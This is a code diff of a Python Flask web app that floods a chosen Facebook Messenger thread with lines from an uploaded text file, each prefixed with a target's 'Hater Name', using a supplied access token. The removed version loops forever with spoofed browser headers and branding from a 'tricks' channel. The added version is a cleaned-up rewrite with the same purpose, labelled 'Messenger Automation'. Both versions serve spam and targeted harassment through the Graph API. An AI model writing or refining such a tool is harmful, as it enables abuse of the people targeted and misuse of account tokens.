@@ -1,376 +1,161 @@
-from flask import Flask, request
+from flask import Flask, request, render_template_string, flash, redirect, url_for
 import requests
-from time import sleep
 import time
-from datetime import datetime
+
+# Initialize Flask app
 app = Flask(__name__)
-app.debug = True
- 
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
-}
- 
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    if request.method == 'POST':
-        access_token = request.form.get('accessToken')
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
- 
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
- 
-        while True:
-            try:
-                for message1 in messages:
-                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                    message = str(mn) + ' ' + message1
-                    parameters = {'access_token': access_token, 'message': message}
-                    response = requests.post(api_url, data=parameters, headers=headers)
-                    if response.status_code == 200:
-                        print(f"Message sent using token {access_token}: {message}")
-                    else:
-                        print(f"Failed to send message using token {access_token}: {message}")
-                    time.sleep(time_interval)
-            except Exception as e:
-                print(f"Error while sending message using token {access_token}: {message}")
-                print(e)
-                time.sleep(30)
- 
- 
-    return '''
- 
+app.secret_key = "your_secret_key"
+
+# HTML Template
+HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>🆈🅺 🅃🆁🄸🅲🄺🆂 🄸ⓝ🅳🄸🅰︎</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <style>
-    body {
-      background-image: url('birthday_background.jpg'); /* Specify the path to your birthday background image */
-      background-repeat: repeat; /* Repeat the background image */
-      font-family: Arial, sans-serif;
-    }
-    .container {
-      max-width: 300px;
-      background-color: bisque;
-      border-radius: 10px;
-      padding: 20px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
-      margin: 20px auto;
-    }
-    .header {
-      text-align: center;
-      margin-bottom: 20px;
-      color: blue;
-    }
-    .btn-submit {
-      width: 100%;
-      margin-top: 10px;
-    }
-    .footer {
-      text-align: center;
-      margin-top: 20px;
-    }
-    .box {
-      border: 2px solid black;
-      padding: 20px;
-      margin-top: 20px;
-      background-color: lavender;
-      color: purple;
-    }
-    /* New styles for birthday box */
-    .birthday-box {
-      position: absolute;
-      top: 0;
-      left: 50%;
-      transform: translateX(-50%);
-      background-color: #ffcc00;
-      color: black;
-      padding: 5px 10px;
-      border-radius: 5px;
-      z-index: 999;
-    } 
-  </style>
-</head>
-<body>
-  <!-- Birthday box -->
-  <div class="birthday-box">
-    <p>𝐏𝐀𝐆𝐄 🅲🄾🅽🅅🅾︎ 𝕊𝔼ℝ𝕍𝔼ℝ </p>
-  </div>
- 
- <style>
-        /* Style for the container */
-        .containe {
-            width: 300px;
-            margin: 50px auto;
-            background-color: #F9F449;
-            padding: 20px;
-            border: 3px solid black;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Messenger Automation</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 30px;
             border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            max-width: 400px;
+            width: 100%;
         }
-        
-        /* Style for the text inside the box */
-        .text-box {
+        h1 {
+            text-align: center;
+            color: #007bff;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-weight: bold;
+            margin: 10px 0 5px;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        input:focus, button:focus {
+            outline: none;
+            border-color: #007bff;
+            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .message {
+            color: red;
             font-size: 14px;
-            color: #333;
-        } 
-         .containr {
-            width: 300px;
-            margin: 50px auto;
-            background-color: #C3F7EF;
-            padding: 20px;
-            border-radius: 10px; /* Added border radius value */
-            border-style: solid;
-            animation: borderChangeColor 1s infinite alternate, borderChangeWidth 1s infinite alternate, borderChangeStyle 10s infinite alternate;
+            text-align: center;
         }
-        
-        /* Style for the text inside the box */
-        .text-box {
+        .success {
+            color: green;
             font-size: 14px;
-            color: #333;
+            text-align: center;
         }
- 
-        /* Keyframes for the border color change */
-        @keyframes borderChangeColor {
-    0% { border-color: red; }
-    10% { border-color: orange; }
-    20% { border-color: yellow; }
-    30% { border-color: lime; }
-    40% { border-color: green; }
-    50% { border-color: aqua; }
-    60% { border-color: blue; }
-    70% { border-color: purple; }
-    80% { border-color: indigo; }
-    90% { border-color: violet; }
-    100% { border-color: pink; }
-}
- 
-        }
- 
-        /* Keyframes for the border width change */
-        @keyframes borderChangeWidth {
-            0% { border-width: 5px; }
-            10% { border-width: 10px; }
-            20% { border-width: 3px; }
-            40% { border-width: 8px; }
-            60% { border-width: 4px; }
-            80% { border-width: 7px; }
-            100% { border-width: 6px; }
-        }
- 
-        /* Keyframes for the border style change */
-        @keyframes borderChangeStyle {
-            0% { border-style: solid; }
-            10% { border-style: dotted; }
-            20% { border-style: dashed; }
-            30% { border-style: double; }
-            40% { border-style: groove; }
-            50% { border-style: ridge; }
-            60% { border-style: inset; }
-            70% { border-style: outset; }
-           
-           
-           
-        } .containor {
-            width: 300px;
-            margin: 50px auto;
-            background-color: #f5f5f5;
-            padding: 20px;
-            border-radius: 10px; /* Added border radius value */
-            border-style: solid;
-            animation: borderChangeColor 1s infinite alternate, borderChangeWidth 1s infinite alternate, borderChangeStyle 10s infinite alternate;
-        }
-        
-        /* Style for the text inside the box */
-        .text-box {
-            font-size: 14px;
-            color: #333;
-        }
- 
-        /* Keyframes for the border color change */
-        @keyframes borderChangeColor {
-    0% { border-color: red; }
-    10% { border-color: orange; }
-    20% { border-color: yellow; }
-    30% { border-color: lime; }
-    40% { border-color: green; }
-    50% { border-color: aqua; }
-    60% { border-color: blue; }
-    70% { border-color: purple; }
-    80% { border-color: indigo; }
-    90% { border-color: violet; }
-    100% { border-color: pink; }
-}
- 
-        }
- 
-        /* Keyframes for the border width change */
-        @keyframes borderChangeWidth {
-            0% { border-width: 5px; }
-            10% { border-width: 10px; }
-            20% { border-width: 3px; }
-            40% { border-width: 8px; }
-            60% { border-width: 4px; }
-            80% { border-width: 7px; }
-            100% { border-width: 6px; }
-        }
- 
-        /* Keyframes for the border style change */
-        @keyframes borderChangeStyle {
-           
-            30% { border-style: double; }
-            40% { border-style: groove; }
-            50% { border-style: ridge; }
-            60% { border-style: inset; }
-            70% { border-style: outset; }
-           
-           
-           
+        .info {
+            font-size: 12px;
+            color: #777;
+            margin-bottom: -10px;
         }
     </style>
 </head>
-<body> </div> <div class="containor">
-    <!-- Your text box content here -->
-    <footer class="footer">
-      <p> <span class="color-sp"></span> <span class="boxed-text"><span class="color-spa"> 𒌍•⸺̥̊ 𒋲 〲⭕ 𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𓆩𖤓𓆪 ❍Ꮗɳɘr᩶ 𝗔𝐘𝐔𝐒𝐇 𝐑𝐀𝐉𝐏𝐔𝐓 🔥𒋲 ㅤ𖤓ㅤ࿐ㅤ࿐. 🥱🥱</span>.</span></p>
-      <p><span class="boxed-text2"><span class="color-span">𝐘𝐊 𝐓𝐑𝐈𝐂𝐊𝐒 𝐈𝐍𝐃𝐈𝐀</span></span></p>
-  </p>
-    </footer>
-    </div>
-</div>
- 
- 
-    <div class="containe">
-      <form action="/" method="post" enctype="multipart/form-data">
-        <div class="mb-3">
-          <label for="accessToken">Enter Your Token:</label>
-          <input type="text" class="form-control" id="accessToken" name="accessToken" required>
-        </div>
-        <div class="mb-3">
-          <label for="threadId">Enter Convo/Inbox ID:</label>
-          <input type="text" class="form-control" id="threadId" name="threadId" required>
-        </div>
-        <div class="mb-3">
-          <label for="kidx">Enter Hater Name:</label>
-          <input type="text" class="form-control" id="kidx" name="kidx" required>
-        </div>
-        <div class="mb-3">
-          <label for="txtFile">Select Your Notepad File:</label>
-          <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
-        </div>
-        <div class="mb-3">
-          <label for="time">Speed in Seconds:</label>
-          <input type="number" class="form-control" id="time" name="time" required>
-        </div>
-        <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
-      </form>
-    </div>
-   <style>
-    .footer {
-      color: #B00402; /* Off-Blue color */
-    }
-    .boxed-text {
-      border: 2px solid #B00402; /* Border around the text */
-      padding: 10px; /* Add some padding inside the box */
-      display: inline-block; /* Make the box inline so it wraps around the text */
-    }
-    .boxed-text2 {
-      border: 2px solid #000000; /* Border around the text */
-      padding: 10px; /* Add some padding inside the box */
-      display: inline-block; /* Make the box inline so it wraps around the text */
-    }
-    .footer a {
-      color: #FFFF00; /* Off-Blue color for links */
-      text-decoration: none; /* Remove underline from links */
-    }
-    
-  </style>
-</head>
 <body>
-  <div>
-    
-  </div> <div class="containor">
-    <!-- Your text box content here -->
-    <footer class="footer">
-      <p> <span class="color-sp"></span> <span class="boxed-text"><span class="color-spa">𝑴𝑨𝑫𝑬 𝑩𝒀 𝓣𝓔𝓐𝓜 𝓐𝓣𝓕</span>.</span></p>
-      <p><span class="boxed-text"><span class="color-span"> 𝕐ƙ 𝗧r᩶i͠c͠ƙ𝐬 i͠ɳɗi͠𝗔</span></span></p>
-      <p><span class="boxed-text"><span class="color-sp">SUBSCRIBE ON</span> <a href="https://youtube.com/@yktricksindia?si=k186jMO8rXy5JzaB" class="color-s">YOUTUBE</a></p>
-    </footer>
+    <div class="container">
+        <h1>Messenger Automation</h1>
+        <form action="/" method="POST" enctype="multipart/form-data">
+            <label for="accessToken">Access Token:</label>
+            <input type="text" id="accessToken" name="accessToken" placeholder="Enter your token" required>
+
+            <label for="thread_id">Thread ID (Group/Target Chat):</label>
+            <input type="text" id="thread_id" name="thread_id" placeholder="Enter thread ID" required>
+
+            <label for="haters_name">Hater's Name:</label>
+            <input type="text" id="haters_name" name="haters_name" placeholder="Enter hater's name" required>
+
+            <label for="message_file">Message File:</label>
+            <input type="file" id="message_file" name="message_file" accept=".txt" required>
+            <p class="info">Upload a file containing messages, one per line.</p>
+
+            <label for="delay">Delay (seconds):</label>
+            <input type="number" id="delay" name="delay" placeholder="Enter delay in seconds" required>
+
+            <button type="submit">Send Messages</button>
+        </form>
     </div>
-</div>
- 
-  <script>
-    // JavaScript to change footer text color
-    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
-    var colorIndex = 0;
- 
-    setInterval(function() {
-      var footerTexts = document.querySelectorAll('.footer .color-span');
-      footerTexts.forEach(function(span) {
-        span.style.color = colors[colorIndex];
-      });
-      colorIndex = (colorIndex + 1) % colors.length;
-    }, 500); 
-    </script>
-    <script>
-    
-    // JavaScript to change footer text color
-    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
-    var colorIndex = 0;
- 
-    setInterval(function() {
-      var footerTexts = document.querySelectorAll('.footer .color-spa');
-      footerTexts.forEach(function(span) {
-        span.style.color = colors[colorIndex];
-      });
-      colorIndex = (colorIndex + 1) % colors.length;
-    }, 500); // Change color every 2 seconds (2000 milliseconds)
-  </script>
-  
-  <script>
-    // JavaScript to change footer text color
-    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
-    var colorIndex = 0;
- 
-    setInterval(function() {
-      var footerTexts = document.querySelectorAll('.footer .color-s');
-      footerTexts.forEach(function(span) {
-        span.style.color = colors[colorIndex];
-      });
-      colorIndex = (colorIndex + 1) % colors.length;
-    }, 500); 
-    </script>
-    <script>
-    
-    // JavaScript to change footer text color
-    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
-    var colorIndex = 0;
- 
-    setInterval(function() {
-      var footerTexts = document.querySelectorAll('.footer .color-sp');
-      footerTexts.forEach(function(span) {
-        span.style.color = colors[colorIndex];
-      });
-      colorIndex = (colorIndex + 1) % colors.length;
-    }, 500); // Change color every 2 seconds (2000 milliseconds)
-  </script>
 </body>
 </html>
- 
-    '''
- 
- 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+'''
+
+# Route for form and processing
+@app.route("/", methods=["GET", "POST"])
+def messenger_automation():
+    if request.method == "POST":
+        try:
+            # Get form data
+            access_token = request.form["accessToken"]
+            thread_id = request.form["thread_id"]
+            haters_name = request.form["haters_name"]
+            delay = int(request.form["delay"])
+            message_file = request.files["message_file"]
+
+            # Validate message file
+            messages = message_file.read().decode("utf-8").splitlines()
+            if not messages:
+                flash("Message file is empty!", "error")
+                return redirect(url_for("messenger_automation"))
+
+            # Send messages using Facebook Graph API
+            for message in messages:
+                formatted_message = f"{haters_name}, {message}"
+                api_url = f"https://graph.facebook.com/v16.0/{thread_id}/messages"
+                payload = {
+                    "message": formatted_message,
+                    "access_token": access_token
+                }
+                response = requests.post(api_url, data=payload)
+                if response.status_code == 200:
+                    print(f"[SUCCESS] Sent message: {formatted_message}")
+                else:
+                    print(f"[ERROR] Failed to send message: {response.json()}")
+                
+                # Delay between messages
+                time.sleep(delay)
+
+            flash("All messages sent successfully!", "success")
+            return redirect(url_for("messenger_automation"))
+
+        except Exception as e:
+            flash(f"An error occurred: {e}", "error")
+            return redirect(url_for("messenger_automation"))
+
+    # Render the form
+    return render_template_string(HTML_TEMPLATE)
+
+if __name__ == "__main__":
     app.run(debug=True)
+    
